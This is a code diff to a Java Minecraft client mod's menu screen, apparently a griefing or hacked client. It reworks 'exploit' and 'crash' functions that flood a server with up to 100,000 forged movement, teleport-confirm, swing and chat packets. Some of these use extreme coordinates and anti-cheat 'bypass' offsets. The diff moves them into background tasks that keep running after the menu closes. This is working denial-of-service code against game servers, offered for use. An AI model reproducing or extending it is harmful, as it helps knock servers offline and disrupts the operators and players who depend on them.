@@ -58,7 +58,7 @@ public class ProfessorScreen extends Screen {
 
     // ── Settings ───────────────────────────────────────────────────────────
     private int     delay = 0, burst = 1, speed = 1;
-    private boolean unlimited = false, timedMode = false, bgMode = false;
+    private boolean unlimited = false, timedMode = false, bgMode = true;
     private int     exploitType = 0, crashType = 0;
     private TextFieldWidget numField, chatField, proxyField;
 
@@ -118,7 +118,7 @@ public class ProfessorScreen extends Screen {
     }
 
     @Override protected void init()    { initAll(); rebuild(); ProfessorMusicManager.onOpen(client); }
-    @Override public void    removed() { ProfessorMusicManager.onClose(client); super.removed(); }
+    @Override public void    removed() { super.removed(); /* music & BG tasks keep running */ }
     @Override public boolean shouldPause() { return false; }
 
     private void initAll() {
@@ -141,7 +141,7 @@ public class ProfessorScreen extends Screen {
             case 4->buildCombat(cx,bpy);  case 5->buildMove(cx,bpy);
             case 6->buildChat(cx,bpy);    case 7->buildProxy(cx,bpy,bpx);
         }
-        addDrawableChild(ButtonWidget.builder(Text.literal("✕  CLOSE"),b->{cs();ProfessorClientMod.clearQueue();close();}).dimensions(cx-48,bpy+PH-30,96,22).build());
+        addDrawableChild(ButtonWidget.builder(Text.literal("✕  CLOSE"),b->{cs();close();}).dimensions(cx-48,bpy+PH-30,96,22).build());
     }
 
     private void switchTab(int t){if(t==tab)return;tab=t;tabSlide=0f;rebuild();}
@@ -161,7 +161,7 @@ public class ProfessorScreen extends Screen {
         for(int[] p:pr){int n=p[0];addDrawableChild(ButtonWidget.builder(Text.literal(n>=1000?(n/1000)+"K":""+n),b->{cs();numField.setText(""+n);}).dimensions(cx+p[1]-28,y+90,56,16).build());}
         addDrawableChild(ButtonWidget.builder(Text.literal("Bypass: "+BP[bypass]),b->{cs();bypass=(bypass+1)%BP.length;b.setMessage(Text.literal("Bypass: "+BP[bypass]));}).dimensions(cx-bw/2,y+110,bw,18).build());
         addDrawableChild(ButtonWidget.builder(Text.literal("Delay: "+delay+"ms"),b->{cs();delay=(delay+5)%55;b.setMessage(Text.literal("Delay: "+delay+"ms"));}).dimensions(cx-bw/2,y+132,bw,16).build());
-        addDrawableChild(ButtonWidget.builder(Text.literal("⛔ STOP QUEUE"),b->{cs();ProfessorClientMod.clearQueue();BackgroundTaskManager.cancelAll();flash("⛔ Queue cleared + BG tasks cancelled",RED);}).dimensions(cx-bw/2,y+152,bw,16).build());
+        addDrawableChild(ButtonWidget.builder(Text.literal("⛔ STOP BACKGROUND"),b->{cs();ProfessorClientMod.clearQueue();BackgroundTaskManager.cancelAll();flash("⛔ Queue cleared + BG tasks cancelled",RED);}).dimensions(cx-bw/2,y+152,bw,16).build());
         addDrawableChild(ButtonWidget.builder(Text.literal("❄ >>>  SEND PACKETS  <<< ❄"),b->{cs();doFlood();}).dimensions(cx-150,y+174,300,28).build());
     }
 
@@ -443,13 +443,30 @@ public class ProfessorScreen extends Screen {
         }
         ctx.drawText(textRenderer,"VL:"+String.format("%.0f",vlEstimate),vmX+vmW+5,vmY,withA(TXT_ICE,160),false);
 
-        // Background task indicator
-        if(!BackgroundTaskManager.isIdle()){
-            int bgX=bpx+PW-160, bgY=bpy+PH-50;
-            int pulse=(int)(140+80*glow);
-            ctx.fill(bgX-2,bgY-2,bgX+155,bgY+12,withA(0xFF001830,200));
-            ctx.fill(bgX-2,bgY-2,bgX+155,bgY-1,withA(GREEN,pulse/2));
-            ctx.drawText(textRenderer,"⚡ BG RUNNING — CLOSE SAFE",bgX,bgY,withA(GREEN,pulse),false);
+        // Background task indicator + progress bar
+        {
+            int bgX=bpx+PW-200, bgY=bpy+PH-52;
+            if(!BackgroundTaskManager.isIdle()){
+                int pulse=(int)(155+80*glow);
+                // Dark backing
+                ctx.fill(bgX-4,bgY-3,bgX+196,bgY+22,withA(0xFF001830,220));
+                ctx.fill(bgX-4,bgY-3,bgX+196,bgY-2,withA(GREEN,pulse));
+                ctx.fill(bgX-4,bgY+22,bgX+196,bgY+23,withA(GREEN,pulse/3));
+                // Text
+                ctx.drawText(textRenderer,"⚡ BG RUNNING — SAFE TO CLOSE",bgX,bgY,withA(GREEN,pulse),false);
+                // Mini progress bar
+                long total=BackgroundTaskManager.getPacketsTotal(),sent=BackgroundTaskManager.getPacketsSent();
+                if(total>0){
+                    int bw2=192, bh2=5;
+                    ctx.fill(bgX,bgY+12,bgX+bw2,bgY+12+bh2,withA(0xFF002244,200));
+                    int fill=(int)(bw2*(float)Math.min(sent,total)/total);
+                    if(fill>0) ctx.fill(bgX,bgY+12,bgX+fill,bgY+12+bh2,withA(GREEN,pulse));
+                    ctx.drawText(textRenderer,sent+"/"+total,bgX+bw2+3,bgY+12,withA(TXT_ICE,120),false);
+                }
+            } else if(!BackgroundTaskManager.getStatus().equals("Idle")){
+                // Show last status briefly
+                ctx.drawText(textRenderer,BackgroundTaskManager.getStatus(),bgX,bgY,withA(BackgroundTaskManager.getStatusColor(),120),false);
+            }
         }
 
         // ── Status bar ─────────────────────────────────────────────────────
@@ -524,30 +541,36 @@ public class ProfessorScreen extends Screen {
     }
 
     private void doExploit(){
-        if(np())return; int n=parseN();
-        switch(exploitType){
-            case 0->{for(int i=0;i<n;i++){if(ProfessorClientMod.canSwing())client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}flash("Swing: "+n,GREEN);}
-            case 1->{for(int i=0;i<Math.min(n,500);i++)client.getNetworkHandler().sendPacket(new UpdateSelectedSlotC2SPacket(i%9));flash("Slot: "+Math.min(n,500),GREEN);}
-            case 2->{for(int i=0;i<Math.min(n,300);i++)client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(i));flash("TeleAck: "+Math.min(n,300),GREEN);}
-            case 3->{for(int i=0;i<n;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+rng.nextGaussian()*.008,client.player.getY(),client.player.getZ()+rng.nextGaussian()*.008,true));flash("MoveFlood: "+n,GREEN);}
-            case 4->{for(int i=0;i<Math.min(n,400);i++)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));flash("Interact: "+Math.min(n,400),GREEN);}
-        }
-        addVl(n*0.125f); triggerBurst();
+        if(np())return; int n=parseN(); final int et=exploitType;
+        final double ex=client.player.getX(),ey=client.player.getY(),ez=client.player.getZ();
+        BackgroundTaskManager.submit("Exploit ×"+n,()->{
+            switch(et){
+                case 0->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++){if(ProfessorClientMod.canSwing()&&client.getNetworkHandler()!=null)try{client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}catch(Exception ignored){}}}
+                case 1->{for(int i=0;i<Math.min(n,500)&&!BackgroundTaskManager.shouldStop();i++)try{if(client.getNetworkHandler()!=null)client.getNetworkHandler().sendPacket(new UpdateSelectedSlotC2SPacket(i%9));}catch(Exception ignored){}}
+                case 2->{for(int i=0;i<Math.min(n,300)&&!BackgroundTaskManager.shouldStop();i++)try{if(client.getNetworkHandler()!=null)client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(i));}catch(Exception ignored){}}
+                case 3->{for(int i=0;i<n&&!BackgroundTaskManager.shouldStop();i++)try{if(client.getNetworkHandler()!=null)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ex+rng.nextGaussian()*.008,ey,ez+rng.nextGaussian()*.008,true));}catch(Exception ignored){}}
+                case 4->{for(int i=0;i<Math.min(n,400)&&!BackgroundTaskManager.shouldStop();i++)try{if(client.getNetworkHandler()!=null)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}catch(Exception ignored){}}
+            }
+        });
+        flash("⚡ Exploit BG ×"+n+" — close screen safely",GREEN); addVl(n*0.125f); triggerBurst();
     }
 
     private void doCrash(){
-        if(np())return;
-        switch(crashType){
-            case 0->{for(int i=0;i<100000;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY()+bypassDY(i),client.player.getZ(),i%2==0));flash("☠ PACKET CRASH 100k",RED);}
-            case 1->{for(int i=0;i<5000;i++)client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(i));flash("☠ NBT CRASH 5k acks",RED);}
-            case 2->{for(int i=0;i<500;i++){client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(i));}flash("☠ BOOK CRASH",RED);}
-            case 3->{for(int i=0;i<5000;i++)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));flash("☠ ENTITY CRASH 5k",RED);}
-            case 4->{for(int i=0;i<10000;i++){client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+bypassX(i),client.player.getY()+bypassDY(i),client.player.getZ()+bypassZ(i),bypassGround(i)));client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(i%32767));}flash("☠ TICK LAG 10k",RED);}
-            case 5->{for(int i=0;i<50000;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+rng.nextGaussian()*1e6,1e8+rng.nextGaussian()*1e5,client.player.getZ()+rng.nextGaussian()*1e6,false));flash("☠ MOVE SPAM 50k",RED);}
-            case 6->{for(int i=0;i<200;i++){try{client.getNetworkHandler().sendChatMessage("xr"+i);}catch(Exception ignored){}}flash("☠ CHAT FLOOD 200",RED);}
-            case 7->{for(int i=0;i<10000;i++)client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(rng.nextInt(32767)));flash("☠ TELEPORT BOMB 10k",RED);}
-        }
-        addVl(50f); triggerBurst();
+        if(np())return; final int ct=crashType;
+        final double cx3=client.player.getX(),cy3=client.player.getY(),cz3=client.player.getZ();
+        BackgroundTaskManager.submit("Crash #"+(ct+1),()->{
+            switch(ct){
+                case 0->{for(int i=0;i<100000&&!BackgroundTaskManager.shouldStop();i++)try{if(client.getNetworkHandler()!=null)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3,cy3+bypassDY(i),cz3,i%2==0));}catch(Exception ignored){}}
+                case 1->{for(int i=0;i<5000&&!BackgroundTaskManager.shouldStop();i++)try{if(client.getNetworkHandler()!=null)client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(i));}catch(Exception ignored){}}
+                case 2->{for(int i=0;i<500&&!BackgroundTaskManager.shouldStop();i++){try{if(client.getNetworkHandler()!=null){client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(i));}}catch(Exception ignored){}}}
+                case 3->{for(int i=0;i<5000&&!BackgroundTaskManager.shouldStop();i++)try{if(client.getNetworkHandler()!=null)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}catch(Exception ignored){}}
+                case 4->{for(int i=0;i<10000&&!BackgroundTaskManager.shouldStop();i++){try{if(client.getNetworkHandler()!=null){client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3+bypassX(i),cy3+bypassDY(i),cz3+bypassZ(i),bypassGround(i)));client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(i%32767));}}catch(Exception ignored){}}}
+                case 5->{for(int i=0;i<50000&&!BackgroundTaskManager.shouldStop();i++)try{if(client.getNetworkHandler()!=null)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx3+rng.nextGaussian()*1e6,1e8+rng.nextGaussian()*1e5,cz3+rng.nextGaussian()*1e6,false));}catch(Exception ignored){}}
+                case 6->{for(int i=0;i<200&&!BackgroundTaskManager.shouldStop();i++)try{if(client.getNetworkHandler()!=null)client.getNetworkHandler().sendChatMessage("xr"+i);}catch(Exception ignored){}}
+                case 7->{for(int i=0;i<10000&&!BackgroundTaskManager.shouldStop();i++)try{if(client.getNetworkHandler()!=null)client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(rng.nextInt(32767)));}catch(Exception ignored){}}
+            }
+        });
+        flash("☠ Queued in BG — close screen safely!",RED); addVl(50f); triggerBurst();
     }
 
     private void combatHit(){if(np())return;for(int i=0;i<200*burst;i++){if(ProfessorClientMod.canSwing())client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}flash("⚔ Hit Spam ×"+(200*burst),ORANGE);addVl(25f);}
